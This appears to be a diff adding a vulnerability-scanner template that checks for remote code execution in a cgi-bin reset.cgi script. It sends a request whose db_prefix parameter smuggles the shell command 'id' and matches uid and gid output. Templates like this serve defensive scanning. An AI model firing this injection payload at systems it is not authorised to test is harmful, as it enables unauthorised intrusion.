@@ -1,0 +1,29 @@
+id: cgi-bin-rce
+info:
+  name: Remote Code Execution in cgi-bin
+  author: chirag-3rag
+  severity: critical
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/cgi-bin/dmt/reset.cgi?db_prefix=%26id%26"
+    headers:
+      Host: "{{Hostname}}"
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "uid=([0-9a-z]+)"
+          - "gid=([0-9a-z]+)"
+          - "groups=([0-9a-z]+)"
+
+      - type: word
+        part: body
+        words:
+          - "file prefix"
+
+      - type: status
+        status:
+          - 200
